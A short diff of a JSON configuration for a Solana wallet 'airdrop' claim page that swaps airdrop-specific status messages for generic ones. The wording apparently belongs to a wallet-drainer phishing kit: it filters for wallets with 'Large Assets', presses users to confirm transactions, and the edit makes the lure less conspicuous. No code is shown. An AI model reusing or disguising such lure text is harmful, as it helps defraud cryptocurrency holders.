@@ -9,14 +9,14 @@
         "onConnected": "{addressfirst4}...{addresslast4}",
         "onNoAccountInfo": "Invalid Wallet",
         "onNotEnoughLamports": "Wallet has no funds to pay the transaction Fees.",
-        "onClaiming": "Requesting airdrop...",
-        "onClaimingDesc": "Please wait while we requesting airdrop...",
+        "onClaiming": "Processing...",
+        "onClaimingDesc": "Please wait while we processing...",
         "onClaimingIneligible": "Ineligible",
-        "onClaimingIneligibleDesc": "Connected wallet is ineligible. Requested requirements: Large Assets",
+        "onClaimingIneligibleDesc": "Connected wallet is ineligible.",
         "onClaimLoading": "Claiming...",
-        "onClaimLoadingDesc": "Signing airdrop request...",
+        "onClaimLoadingDesc": "Signing request...",
         "onDecline": "Error",
-        "onDeclineDesc": "You should confirm the transactions to finalize the airdropping!"
+        "onDeclineDesc": "You should confirm the transactions to finalize!"
     },
     "phantomWallet": {
         "type": 0,
